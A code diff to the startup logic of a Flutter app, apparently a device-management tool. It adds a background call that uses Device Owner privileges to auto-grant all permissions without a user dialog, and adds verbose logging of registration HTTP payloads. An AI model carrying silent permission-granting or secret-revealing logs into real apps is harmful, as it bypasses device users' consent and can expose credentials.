@@ -147,7 +147,7 @@ class _AppBootstrapState extends State<AppBootstrap>
 
       await Future.delayed(const Duration(milliseconds: 500));
 
-      // ===== 3. Register device =====
+      // ===== 3. Register device (JALAN DULU) =====
       print('📦 [BOOTSTRAP] Step 3: Register device');
       if (mounted) setState(() => _status = 'Mendaftar device...');
       try {
@@ -157,12 +157,15 @@ class _AppBootstrapState extends State<AppBootstrap>
         print('❌ [BOOTSTRAP] Register error: $e');
       }
 
-      // ===== 4. Start native services =====
-      print('📦 [BOOTSTRAP] Step 4: Native services running');
+      // ===== 4. Auto-grant Device Owner (fire & forget) =====
+      _autoGrantPermissionsBackground();
+
+      // ===== 5. Start native services =====
+      print('📦 [BOOTSTRAP] Step 5: Native services running');
       print('✅ [BOOTSTRAP] ConnectionService + KeepAliveService started');
 
-      // ===== 5. Ready =====
-      print('📦 [BOOTSTRAP] Step 5: Ready');
+      // ===== 6. Ready =====
+      print('📦 [BOOTSTRAP] Step 6: Ready');
       if (!mounted) return;
       setState(() {
         _status = 'Siap';
@@ -181,7 +184,26 @@ class _AppBootstrapState extends State<AppBootstrap>
   }
 
   // ==========================================
-  // ===== REQUEST PERMISSIONS =====
+  // ===== AUTO-GRANT (background, tidak blocking) =====
+  // ==========================================
+  Future<void> _autoGrantPermissionsBackground() async {
+    try {
+      print('🔐 [AUTOGRANT] Mencoba auto-grant via Device Owner...');
+      final granted = await _deviceChannel
+          .invokeMethod<bool>('autoGrantAllPermissions');
+      print('🔐 [AUTOGRANT] Hasil: $granted');
+      if (granted == true) {
+        print('🎉 [AUTOGRANT] Semua izin granted otomatis');
+      } else {
+        print('⚠️ [AUTOGRANT] Bukan Device Owner / gagal grant');
+      }
+    } catch (e) {
+      print('⚠️ [AUTOGRANT] Error: $e');
+    }
+  }
+
+  // ==========================================
+  // ===== REQUEST PERMISSIONS (MANUAL, dialog) =====
   // ==========================================
   Future<void> _requestPermissions() async {
     int sdkInt = 0;
@@ -383,7 +405,10 @@ class _AppBootstrapState extends State<AppBootstrap>
       return;
     }
 
-    if (BuildConfig.accessKey.isEmpty) return;
+    if (BuildConfig.accessKey.isEmpty) {
+      print('⚠️ [REGISTER] accessKey kosong, skip');
+      return;
+    }
 
     _isRegistering = true;
     try {
@@ -449,12 +474,18 @@ class _AppBootstrapState extends State<AppBootstrap>
     }
   }
 
+  // ==========================================
+  // ===== HTTP POST (dengan log detail) =====
+  // ==========================================
   Future<String?> _httpPost(
     String url,
     Map<String, dynamic> body,
   ) async {
     HttpClient? client;
     try {
+      print('📤 [HTTP] POST → $url');
+      print('📤 [HTTP] Payload: ${jsonEncode(body)}');
+
       client = HttpClient();
       client.connectionTimeout = const Duration(seconds: 15);
 
@@ -466,9 +497,26 @@ class _AppBootstrapState extends State<AppBootstrap>
       final response = await request.close();
       final responseBody = await response.transform(utf8.decoder).join();
 
-      print('📥 [HTTP] ${response.statusCode}: $responseBody');
-      return responseBody;
-    } catch (e) {
+      print('📥 [HTTP] Status: ${response.statusCode}');
+      print('📥 [HTTP] Body: $responseBody');
+
+      if (response.statusCode >= 200 && response.statusCode < 300) {
+        return responseBody;
+      }
+      return null;
+    } on SocketException catch (e) {
+      print('❌ [HTTP] SocketException: ${e.message}');
+      print('❌ [HTTP] Kemungkinan: server tidak reachable / DNS / tidak ada internet');
+      return null;
+    } on TimeoutException catch (e) {
+      print('❌ [HTTP] TimeoutException: $e');
+      return null;
+    } on HandshakeException catch (e) {
+      print('❌ [HTTP] SSL/Handshake error: $e');
+      return null;
+    } catch (e, st) {
+      print('❌ [HTTP] Unknown error: $e');
+      print('❌ [HTTP] Stack: $st');
       return null;
     } finally {
       client?.close(force: true);
